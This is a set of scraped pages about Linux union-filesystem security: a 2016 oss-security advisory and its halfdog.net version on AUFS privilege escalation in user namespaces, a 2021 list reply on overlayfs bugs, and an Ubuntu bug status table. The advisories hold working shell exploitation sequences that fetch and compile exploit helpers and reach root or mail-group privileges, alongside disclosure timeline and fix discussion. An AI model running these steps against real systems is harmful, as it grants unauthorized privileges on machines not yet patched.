=== Content from www.openwall.com_3d5cb7f3_20250125_134544.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](10) [[thread-next>]](../../../2016/03/02/12) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>
Date: Wed, 24 Feb 2016 06:14:56 +0000
From: halfdog <me@...fdog.net>
To: oss-security@...ts.openwall.com
Subject: Aufs Union Filesystem Privilege Escalation In User Namespaces

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[<http://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamespaces/>]

Introduction:
=============

* Problem description:

Aufs is a union filesystem to mix content of different underlying
filesystems, e.g. read-only medium with r/w RAM-fs. That is also
allowed in user namespaces when module was loaded with allow_userns
option. Due to different bugs, aufs in a crafted USERNS allows
privilege escalation, which is a problem on systems enabling
unprivileged USERNS by default, e.g. Ubuntu Wily. All the issues
mentioned here were discovered after performing similar analysis on
overlayfs, another USERNS enabled union filesystem.

For a system to be exposed, unprivileged USERNS has to be available
and AUFS support enabled for it by loading the aufs module with the
appropriate option: modprobe aufs allow_userns.

AUFS Over Fuse: Loss of Nosuid:
===============================

* Method:

Fuse filesystem can be mounted by unprivileged users with the help of
the fusermount SUID program. Fuse then can simulate files of any type,
mode, UID but they are only visible to the user mounting the
filesystem and lose all SUID properties. Those files can be exposed
using aufs including the problematic SUID properties. The basic
exploitation sequence is:

    Mount fuse filesystem exposing crafted SUID binary
    Create USERNS
    Mount aufs on top of fuse
    Execute the SUID binary via aufs from outside the namespace

The issue can then be demonstrated using:

test$ mkdir fuse mnt work
test$ mv SuidExec RealFile
test$ ./FuseMinimal fuse
test$ ./UserNamespaceExec -- /bin/bash
root$ mount -t aufs -o br=work:fuse none mnt
root$ cd mnt
# Now cwd of the former process is within the aufs mount. Use
# another shell to complete.
test$ /proc/2390/cwd/file /bin/bash
root$ id
uid=0(root) gid=100(users) groups=100(users)
# Go back to old shell for cleanup.
root$ cd ..; umount mnt; exit
test$ fusermount -u fuse

* Discussion:

In my opinion, fuse filesystem allowed pretending to have files with
different UIDs/GIDs in the local mount namespace, but they never had
those properties, those files would have, when really stored on local
disk. So e.g., the SUID binaries lost their SUID-properties and the
owner could also modify arbitrary file content, even if file
attributes were pretending, that he does not have access - by having
control over the fuse process simulating the filesystem, such access
control is futile. That is also the reason, why no other user than the
one mounting the filesystem may have rights to access it by default.

In my optionion the workarounds should be to restrict access to fuse
also only to the mount namespace where it was created.

AUFS Xattr Setgid Privilege Escalation:
=======================================

* Method:

Due to inheritance of Posix ACL information (xattrs) when aufs is
copying files and not cleaning those additional and unintended ACL
attribues, SGID directories may become user writable, thus allowing to
gain privileges of this group using methods described in [0]. Suitable
target directories can be easily found using find / -perm -02020 2>
/dev/null. On standard Ubuntu system those are:

/usr/local/lib/python3.4 (root.staff)
/var/lib/libuuid (libuuid.libuuid)
/var/local (root.staff)
/var/mail (root.mail)

Exploitation can be done just combining standard tools with the
SetgidDirectoryPrivilegeEscalation exploit [0].

test$ wget -q
<http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c>
<http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c>
<http://www.halfdog.net/Misc/Utils/SuidExec.c>
test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
test$ gcc -o UserNamespaceExec UserNamespaceExec.c
test$ gcc -o SuidExec SuidExec.c
test$ mkdir mnt test
test$ setfacl -m "d:u:$(id -u):rwx" test
test$ ./UserNamespaceExec -- /bin/bash
root$ mount -t aufs -o br=test:/var none mnt
root$ chmod 07777 mnt/mail
root$ umount mnt; exit
test$ ./CreateSetgidBinary test/mail/escalate /bin/mount x nonexistent-arg
test$ test/mail/escalate ./SuidExec /usr/bin/id
uid=1000(test) gid=8(mail) groups=8(mail),100(users)

On Ubuntu, exploitation allows interference with mail spool and allows
to gain privileges of other python processes using python
dist-packages owned by user root.staff. If root user calls a python
process in that way, e.g. via apport crash dump tool, local root
escalation is completed.

According to this post [1], directories or binaries owned by group
staff are in the default PATH of the root user, hence local root
escalation is trivial.

Results, Discussion:
====================

* Fixing the issue itself:

As enabling a given file system type to be manipulated by unprivileged
users, this will significantly increase attack surface. Thus a USERNS
support should not be added frivolously but only after a good security
re-audit of the codebase.

* Avoiding numerous namespace issues in future:

In my opinion, enabing USERNS was a little too fast, as it exposes a
lot of additional kernel code to users without any special
capabilities in init-ns by using the elevated privileges within the
container. This is also recognized by others, but there is dispute on
the consequences to draw from that. See Patch to disable unprivileged
userns ... on LKML [2].

I completely second the request to have options to disable the USERNS
layer as it depends on the system type, if USERNS is a net gain
regarding security or a net loss. It should be a gain on systems,
where it allows to perform critical operations within a containment, a
use-case where chroots are used currently. Without USERNS, those
operations are likely to be performed with SUID helpers in the init-ns
or privilege separation might be dropped completely as the overhead is
too large for efficient work procedures.

On the other hand, systems where all processes have similar security
level, e.g. as they all process the same data, further privilege
separation is not easy. The USERNS support will add only new risks here.

Timeline:
=========

* 20160114: Aufs developers analyzing similar overlayfs issue [3] in [4]
* 20160213: Discovery
* 20160214: Report to Aufs contact mentioned on sourceforge [5]
* 20160219: Fix released: AUFS list post [6]
* 20161122: CRD and publication together with nearly identical
overlayfs issue

References:
===========

[0]
<http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>
[1] <http://www.openwall.com/lists/oss-security/2016/01/16/7>
[2] <https://lkml.org/lkml/2016/1/22/7>
[3]
<http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/>
[4] <https://sourceforge.net/p/aufs/mailman/message/34766916/>
[5] <https://sourceforge.net/projects/aufs/>
[6] <https://sourceforge.net/p/aufs/mailman/message/34864744/>

- --
<http://www.halfdog.net/>
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlbNSlUACgkQxFmThv7tq+5bOwCfTEWEvT4hsg8DIjDa5bkSKVWx
lAcAn3sN7LEA03OurkFl9omKLPxAZfNi
=hQz+
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_377c8c08_20250125_134544.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2021/10/16/1) [[next>]](../../../2021/10/19/1) [[<thread-prev]](../../../2021/10/14/3) [[thread-next>]](../../../2021/10/19/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <4095-1634579571.798266@3V_h.d15S.uAgJ>
Date: Mon, 18 Oct 2021 17:52:51 +0000
From: halfdog <me@...fdog.net>
To: Alon Zahavi <Alon.Zahavi@...erark.com>
cc: oss-security@...ts.openwall.com
Subject: Re: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up

Alon Zahavi writes:
>
> After disclosing the issue with the linux-distros mailing list,
> I am reporting the security issue publicly to here. There is
> no patch available and may not be available for a long time
> because the kernel can't enforce the mitigation proposed, as
> that would be a layering violation and could also possibly
> cause a regression. This vulnerability was attached with
> CVE-2021-3847. Here is the report that was initially sent:
> ...

Just funny, just hours before this mail I got 3 mails on different
overlayfs copy-up vuln, e.g.

"""
The Precise Pangolin has reached end of life, so this bug will not be
fixed for that release

** Changed in: linux (Ubuntu Precise)
       Status: New => Won't Fix

--
You received this bug notification because you are subscribed to the bug
report.
<https://bugs.launchpad.net/bugs/1534961>
"""
...

[Bug 1534961] Re: CVE-2016-1575
[Bug 1547400] Re: CVE-2016-2853
[Bug 1535150] Re: CVE-2016-1576

So it is 5 years and not so much changed :-)

Overlayfs and alike where lower privileged user can simultaneously
access lower/upper AND the mounted file system is extremely dangerous
and prone to so many vulns, that nobody should use/allow that.

hd

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.halfdog.net_ed6d96eb_20250125_134543.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2016](/Security/2016/) / AufsPrivilegeEscalationInUserNamespaces /

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity%2F2016%2FAufsPrivilegeEscalationInUserNamespaces%2F&t=AUFS%20Privilege%20Escalation%20in%20User%20Namespaces "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamespaces/ "google+")
# Introduction

## Problem description:

Aufs is a union filesystem to mix content
of different underlying filesystems, e.g. read-only medium with
r/w RAM-fs. That is also allowed in user namespaces when module
was loaded with *allow\_userns* option. Due to different bugs,
aufs in a crafted USERNS allows privilege escalation, which is
a problem on systems enabling unprivileged USERNS by default,
e.g. Ubuntu Wily. All the issues mentioned here were discovered
after performing similar analysis on overlayfs, another USERNS
enabled union filesystem.

For a system to be exposed, unprivileged USERNS has to be available
and AUFS support enabled for it by loading the aufs module with
the appropriate option: *modprobe aufs allow\_userns*.

# AUFS Over Fuse: Loss of Nosuid

## Method:

Fuse filesystem can be mounted by unprivileged
users with the help of the *fusermount* SUID program. Fuse
then can simulate files of any type, mode, UID but they are only
visible to the user mounting the filesystem and lose all SUID
properties. Those files can be exposed using aufs including the
problematic SUID properties. The basic exploitation sequence is:

* Mount fuse filesystem exposing crafted SUID binary
* Create USERNS
* Mount aufs on top of fuse
* Execute the SUID binary via aufs from outside the namespace

The issue can then be demonstrated using:

test$ mkdir fuse mnt work
test$ mv [SuidExec](/Misc/Utils/SuidExec.c) RealFile
test$ [./FuseMinimal](FuseMinimal.c) fuse
test$ [./UserNamespaceExec](/Misc/Utils/UserNamespaceExec.c) -- /bin/bash
root$ mount -t aufs -o br=work:fuse none mnt
root$ cd mnt
# Now cwd of the former process is within the aufs mount. Use
# another shell to complete.
test$ /proc/2390/cwd/file /bin/bash
root$ id
uid=0(root) gid=100(users) groups=100(users)
# Go back to old shell for cleanup.
root$ cd ..; umount mnt; exit
test$ fusermount -u fuse

## Discussion:

In my opinion, fuse filesystem allowed
pretending to have files with different UIDs/GIDs in the local
mount namespace, but they never had those properties, those files
would have, when really stored on local disk. So e.g., the SUID
binaries lost their SUID-properties and the owner could also modify
arbitrary file content, even if file attributes were pretending,
that he does not have access - by having control over the fuse
process simulating the filesystem, such access control is futile.
That is also the reason, why no other user than the one mounting
the filesystem may have rights to access it by default.

In my optionion the workarounds should be to restrict access
to fuse also only to the mount namespace where it was created.

# AUFS Xattr Setgid Privilege Escalation

## Method:

Due to inheritance of Posix ACL information
(xattrs) when aufs is copying files and not cleaning those additional
and unintended ACL attribues, SGID directories may become user
writable, thus allowing to gain privileges of this group using
methods described in [SetgidDirectoryPrivilegeEscalation](/Security/2015/SetgidDirectoryPrivilegeEscalation/).
Suitable target directories can be easily found using *find
/ -perm -02020 2> /dev/null*. On standard Ubuntu system those are:

/usr/local/lib/python3.4 (root.staff)
/var/lib/libuuid (libuuid.libuuid)
/var/local (root.staff)
/var/mail (root.mail)

Exploitation can be done just combining standard tools with
the [SetgidDirectoryPrivilegeEscalation](/Security/2015/SetgidDirectoryPrivilegeEscalation/)
exploit.

test$ wget -q https://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c https://www.halfdog.net/Misc/Utils/UserNamespaceExec.c https://www.halfdog.net/Misc/Utils/SuidExec.c
test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
test$ gcc -o UserNamespaceExec UserNamespaceExec.c
test$ gcc -o SuidExec SuidExec.c
test$ mkdir mnt test
test$ setfacl -m "d:u:$(id -u):rwx" test
test$ ./UserNamespaceExec -- /bin/bash
root$ mount -t aufs -o br=test:/var none mnt
root$ chmod 07777 mnt/mail
root$ umount mnt; exit
test$ ./CreateSetgidBinary test/mail/escalate /bin/mount x nonexistent-arg
test$ test/mail/escalate ./SuidExec /usr/bin/id
uid=1000(test) gid=8(mail) groups=8(mail),100(users)

On Ubuntu, exploitation allows interference with mail spool
and allows to gain privileges of other python processes using
python dist-packages owned by user *root.staff*. If root
user calls a python process in that way, e.g. via apport crash
dump tool, local root escalation is completed.

According to [this post](http://www.openwall.com/lists/oss-security/2016/01/16/7),
directories or binaries owned by group *staff* are in the
default PATH of the *root* user, hence local root escalation
is trivial.

# Results, Discussion

## Fixing the issue itself:

As enabling a given file system type to
be manipulated by unprivileged users, this will significantly
increase attack surface. Thus a USERNS support should not be added
frivolously but only after a good security re-audit of the codebase.

## Avoiding numerous namespace issues in future:

In my opinion, enabing USERNS was a little
too fast, as it exposes a lot of additional kernel code to users
without any special capabilities in init-ns by using the elevated
privileges within the container. This is also recognized by others,
but there is dispute on the consequences to draw from that. See
[Patch to disable unprivileged userns ...](https://lkml.org/lkml/2016/1/22/7) on LKML.

I completely second the request to have options to disable
the USERNS layer as it depends on the system type, if USERNS is
a net gain regarding security or a net loss. It should be a gain
on systems, where it allows to perform critical operations within
a containment, a use-case where chroots are used currently. Without
USERNS, those operations are likely to be performed with SUID
helpers in the init-ns or privilege separation might be dropped
completely as the overhead is too large for efficient work procedures.

On the other hand, systems where all processes have similar
security level, e.g. as they all process the same data, further
privilege separation is not easy. The USERNS support will add
only new risks here.

# Timeline

* 20160213: Discovery
* 20160214: Report to Aufs contact mentioned on [sourceforge](https://sourceforge.net/projects/aufs/)
* 20160219: Fix released: [AUFS list post](https://sourceforge.net/p/aufs/mailman/message/34864744/)
* 20161122: CRD and publication together with nearly identical overlayfs issue
# Material, References

* [CVE-2016-2853](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2853) ([CVSSv3 ??](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-2853)): AUFS over fuse loss of nosuid
* [CVE-2016-2854](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2854) ([CVSSv3 ??](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-2854)): AUFS xattr setgid privilege escalation
* AUFS Mailing list posts:
  + [20160114](https://sourceforge.net/p/aufs/mailman/message/34766916/): trying to reproduce [overlayfs-issue](../../2015/UserNamespaceOverlayfsSetuidWriteExec/)
  + [20160219](https://sourceforge.net/p/aufs/mailman/message/34864744/): announcement security fix
* 3wem exploitation example from 2017-03-13? on updated? Ubuntu 16.10? - nice work but missing the final step: root in USERNS is NOT real root! [https://medium.com/@3wem/pluck-d5d1c05ab2e0](https://medium.com/%403wem/pluck-d5d1c05ab2e0)

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from bugs.launchpad.net_de82cdbe_20250126_090704.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[linux package](https://launchpad.net/ubuntu/%2Bsource/linux)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/linux)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/linux)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/linux)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/linux)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/linux)

# CVE-2016-1575

Bug #1534961 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2016-01-16

[268](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [linux (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux "Latest release: 6.12.0-12.12, uploaded to main on 2025-01-22 14:57:10.708421+00:00 by Paolo Pisati (p-pisati), maintained by Ubuntu Kernel Team (kernel-team)") | Fix Released | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux) | Won't Fix | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux) | Fix Released | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux) | Fix Released | Medium | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux) | Fix Released | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux) | Fix Released | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux) | Fix Released | Medium | Unassigned |  |
|  | [linux-armadaxp (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-armadaxp "Latest release: 3.2.0-1687.114, uploaded to main on 2017-03-31 15:57:13.710232+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-armadaxp) | Won't Fix | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-armadaxp) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-armadaxp) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-armadaxp) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-armadaxp) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-armadaxp) | Invalid | Medium | Unassigned |  |
|  | [linux-flo (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-flo "Latest release: 3.4.0-5.23, uploaded to universe on 2016-02-25 16:09:09.862442+00:00 by Andy Whitcroft (apw), maintained by Ubuntu Kernel Team (kernel-team)") | New | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-flo) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-flo) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-flo) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-flo) | New | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-flo) | New | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-flo) | New | Medium | Unassigned |  |
|  | [linux-goldfish (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-goldfish "Latest release: 3.4.0-4.27, uploaded to universe on 2016-02-24 19:44:11.446450+00:00 by Andy Whitcroft (apw), maintained by Ubuntu Kernel Team (kernel-team)") | New | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-goldfish) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-goldfish) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-goldfish) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-goldfish) | New | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-goldfish) | New | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-goldfish) | New | Medium | Unassigned |  |
|  | [linux-lts-quantal (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-quantal "Latest release: 3.5.0-54.81~precise1, uploaded to main on 2014-07-15 03:57:16.318963+00:00 by Luis Henriques (henrix), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-quantal) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-quantal) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-quantal) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-quantal) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-quantal) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-quantal) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-raring (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-raring "Latest release: 3.8.0-44.66~precise1, uploaded to main on 2014-07-15 03:56:15.766609+00:00 by Luis Henriques (henrix), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-raring) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-raring) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-raring) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-raring) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-raring) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-raring) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-saucy (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-saucy "Latest release: 3.11.0-26.45~precise1, uploaded to main on 2014-07-15 03:54:58.962180+00:00 by Luis Henriques (henrix), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-saucy) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-saucy) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-saucy) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-saucy) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-saucy) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-saucy) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-trusty (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-trusty "Latest release: 3.13.0-185.236~12.04.1, uploaded to main on 2021-03-18 15:43:09.304736+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-trusty) | Fix Released | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-trusty) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-trusty) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-trusty) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-trusty) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-trusty) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-utopic (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-utopic "Latest release: 3.16.0-77.99~14.04.1, uploaded to main on 2016-06-28 19:14:13.130402+00:00 by Kamal Mostafa (kamalmostafa), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-utopic) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-utopic) | Fix Released | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-utopic) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-utopic) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-utopic) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-utopic) | Invalid | Medium | Unassigned |  |
